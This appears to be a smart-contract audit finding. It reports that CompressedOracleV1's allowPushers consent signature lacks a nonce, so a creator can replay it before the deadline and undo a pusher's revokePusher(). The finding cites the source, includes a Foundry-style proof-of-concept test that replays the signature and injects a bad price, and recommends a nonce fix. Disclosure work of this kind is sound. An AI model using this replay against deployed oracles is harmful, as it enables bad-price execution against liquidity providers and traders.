### Title
`revokePusher()` Is Ineffective Before Deadline Expiry Due to Missing Nonce in Delegation Consent Hash — (`smart-contracts-poc/contracts/oracles/compressed/CompressedOracle.sol`)

---

### Summary

`allowPushers` in `CompressedOracleV1` verifies a pusher's EIP-191 consent signature whose hash commits to `(chainid, address(this), deadline, pusher, creator)` but includes **no nonce**. A creator who holds a valid, unexpired signature can replay it an unlimited number of times. This makes `revokePusher()` — the pusher's only self-protection mechanism — completely ineffective before the deadline expires: the creator can re-establish the delegation in the same block the pusher revokes it, forcing the pusher's price updates to continue landing in the creator's namespace and reaching any pool that consumes that namespace as its oracle source.

---

### Finding Description

`allowPushers` builds the consent digest as:

```solidity
bytes32 hash = MessageHashUtils.toEthSignedMessageHash(
    keccak256(abi.encode(block.chainid, address(this), deadline, pusher, msg.sender))
);
require(pusher == ECDSA.recover(hash, signatures[i]));
namespaceRemapping[pusher] = msg.sender;
``` [1](#0-0) 

The code's own NatSpec acknowledges the replay risk:

> *"The deadline is likewise required: the signed consent carries no timestamp of its own, so an undated signature could re-establish a delegation AFTER the pusher revoked it."* [2](#0-1) 

The comment treats the deadline as the replay guard. But `_ensureDeadline` only rejects calls where `block.timestamp > deadline`:

```solidity
function _ensureDeadline(uint256 deadline) internal view virtual {
    require(block.timestamp <= deadline, DeadlineExceeded());
}
``` [3](#0-2) 

So any signature that has not yet expired is unconditionally replayable. `revokePusher()` clears `namespaceRemapping[pusher]` to `address(0)`:

```solidity
function revokePusher() external {
    address creator = namespaceRemapping[msg.sender];
    if (creator == address(0) || creator == msg.sender) revert NoSelfRemapping();
    namespaceRemapping[msg.sender] = address(0);
    emit PusherRevoked(msg.sender, creator);
}
``` [4](#0-3) 

But `allowPushers` writes `namespaceRemapping[pusher] = msg.sender` unconditionally whenever the signature verifies and the deadline has not passed. There is no consumed-signature registry, no per-pusher nonce, and no state check that prevents re-delegation after a revocation. The creator can call `allowPushers` with the original signature in the same transaction (or block) that the pusher calls `revokePusher()`, restoring the mapping immediately.

---

### Impact Explanation

Every fallback push from the pusher resolves its target namespace via `namespaceRemapping`:

```
fallback push → namespace resolution (namespaceRemapping[msg.sender]) → slot write in creator namespace
``` [5](#0-4) 

If the creator's namespace is the oracle source for a live pool (via `AnchoredPriceProvider` → `CompressedOracleV1.price(feedId, pool)`), then every price the pusher submits — including stale or compromised prices — reaches that pool's swap path. The pusher has no on-chain mechanism to stop this before the deadline. A pusher whose signing key is compromised, or who discovers the creator is routing their prices into a pool they did not intend to serve, cannot revoke the delegation. The creator replays the original signature and the pusher's prices continue to feed the pool, constituting bad-price execution against the pool's LPs and traders.

**Impact: Medium** — direct bad-price execution path to a live pool is reachable, but requires the pusher to continue submitting updates (they can stop pushing as a last resort, though this may break their own namespace feeds).

---

### Likelihood Explanation

The pusher signs a consent with a deadline that is typically days or weeks in the future (the test suite uses `block.timestamp + 1 days`). Any creator who wants to retain a pusher against their will — or any attacker who has obtained the creator's key — can replay the signature at zero cost. The pusher has no on-chain way to detect or prevent this. The replay requires only a standard `allowPushers` call with the already-public signature.

**Likelihood: Medium** — requires a malicious or negligent creator, but the attack is trivially executable with no additional privileges.

---

### Recommendation

Add a per-pusher nonce to the consent hash and increment it on every successful `allowPushers` call (or on every `revokePusher` / `removePushers` call). The nonce must be stored on-chain and included in the signed digest:

```solidity
// storage
mapping(address pusher => uint256 nonce) public pusherNonce;

// in allowPushers:
bytes32 hash = MessageHashUtils.toEthSignedMessageHash(
    keccak256(abi.encode(
        block.chainid, address(this), deadline,
        pusher, msg.sender,
        pusherNonce[pusher]   // ← add nonce
    ))
);
require(pusher == ECDSA.recover(hash, signatures[i]));
pusherNonce[pusher]++;        // ← invalidate on use
namespaceRemapping[pusher] = msg.sender;
```

Additionally, increment `pusherNonce[msg.sender]` inside `revokePusher()` so that any previously signed consent is immediately invalidated even if the deadline has not expired.

---

### Proof of Concept

```solidity
// 1. Pusher signs consent with deadline = now + 7 days
uint256 deadline = block.timestamp + 7 days;
bytes32 digest = MessageHashUtils.toEthSignedMessageHash(
    keccak256(abi.encode(block.chainid, address(oracle), deadline, pusher, creator))
);
(uint8 v, bytes32 r, bytes32 s) = vm.sign(PUSHER_KEY, digest);
bytes memory sig = abi.encodePacked(r, s, v);

// 2. Creator establishes delegation
address[] memory pushers = new address[](1);
pushers[0] = pusher;
bytes[] memory sigs = new bytes[](1);
sigs[0] = sig;
vm.prank(creator);
oracle.allowPushers(deadline, pushers, sigs);
assertEq(oracle.namespaceRemapping(pusher), creator); // delegated

// 3. Pusher revokes
vm.prank(pusher);
oracle.revokePusher();
assertEq(oracle.namespaceRemapping(pusher), address(0)); // cleared

// 4. Creator replays the SAME signature — succeeds because deadline has not expired
vm.prank(creator);
oracle.allowPushers(deadline, pushers, sigs);
assertEq(oracle.namespaceRemapping(pusher), creator); // re-established!

// 5. Pusher's next fallback push lands in creator's namespace, not their own
uint56 tsMs = uint56(block.timestamp * 1000);
uint48 raw = _packRaw(9_000_000, 5, 5); // attacker-controlled bad price
vm.prank(pusher);
(bool ok,) = address(oracle).call(_wordAt(0, 0, raw, tsMs));
assertTrue(ok);
// Price lands in creator namespace → consumed by pool oracle → bad-price execution
assertEq(oracle.getOracleData(oracle.feedIdOf(creator, 0, 0)).price, U64x32.decode(uint32(raw >> 16)));
assertEq(oracle.getOracleData(oracle.feedIdOf(pusher,  0, 0)).price, 0); // pusher's own ns empty
```

### Citations

**File:** smart-contracts-poc/contracts/oracles/compressed/CompressedOracle.sol (L163-178)
```text
    function price(bytes32 feedId, address /* pool */)
        external
        view
        returns (uint256 mid, uint256 spread, uint16 spread1, uint256 refTime)
    {
        return _price(feedId);
    }

    function _price(bytes32 feedId)
        internal
        view
        returns (uint256 mid, uint256 spread, uint16 spread1, uint256 refTime)
    {
        OracleData memory data = getOracleData(feedId);
        return (uint256(data.price), uint256(data.spread0), data.spread1, data.timestampMs.toSeconds());
    }
```

**File:** smart-contracts-poc/contracts/oracles/compressed/CompressedOracle.sol (L186-191)
```text
    /// @notice Delegates pusher wallets into the caller's namespace. The pusher's EIP-191
    ///         signature is REQUIRED — without it anyone could remap a foreign pusher
    ///         wallet into their own namespace and silently swallow its pushes. The
    ///         deadline is likewise required: the signed consent carries no timestamp of
    ///         its own, so an undated signature could re-establish a delegation AFTER the
    ///         pusher revoked it.
```

**File:** smart-contracts-poc/contracts/oracles/compressed/CompressedOracle.sol (L204-209)
```text
            bytes32 hash = MessageHashUtils.toEthSignedMessageHash(
                keccak256(abi.encode(block.chainid, address(this), deadline, pusher, msg.sender))
            );
            require(pusher == ECDSA.recover(hash, signatures[i]));

            namespaceRemapping[pusher] = msg.sender;
```

**File:** smart-contracts-poc/contracts/oracles/compressed/CompressedOracle.sol (L238-243)
```text
    function revokePusher() external {
        address creator = namespaceRemapping[msg.sender];
        if (creator == address(0) || creator == msg.sender) revert NoSelfRemapping();
        namespaceRemapping[msg.sender] = address(0);
        emit PusherRevoked(msg.sender, creator);
    }
```

**File:** smart-contracts-poc/contracts/oracles/compressed/OracleBase.sol (L124-126)
```text
    function _ensureDeadline(uint256 deadline) internal view virtual {
        require(block.timestamp <= deadline, DeadlineExceeded());
    }
```
